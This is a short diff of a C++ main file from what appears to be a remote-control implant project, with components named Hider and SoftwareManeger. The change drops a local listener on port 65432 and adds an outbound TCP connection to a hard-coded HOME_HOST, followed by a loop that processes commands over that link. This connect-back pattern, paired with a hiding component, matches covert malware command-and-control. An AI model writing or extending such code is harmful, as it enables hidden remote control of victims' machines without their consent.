@@ -9,6 +9,7 @@
 #include "../Hider/HiderCodes.h"
 #include "Listener.h"
 #include "Connection.h"
+#include "../IncludeCPP/globalDefines.h"
 
 #define PORT (65432)
 
@@ -19,18 +20,15 @@ int main() {
     
     SoftwareManeger swm = SoftwareManeger();
     HiderManeger& hiderManager = HiderManeger::getInstance();
-    Listener listener = Listener(PORT);
+    std::shared_ptr<Connection> conn;
+    if (Connection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
+        exit(EXIT_FAILURE);
+    }
+
 
     bool cont = true;
     while (cont)
     {
-        std::shared_ptr<Connection> conn;
-        // TODO add error strtegy
-        if (listener.acceptConnection(conn) == -1) {
-            std::cerr << "listener acception error: " << strerror(errno) << std::endl;
-            sleep(10);
-            continue;
-        }
         loopIter(conn, swm, hiderManager);
         std::cout << "compleated loop iter\n";
     }
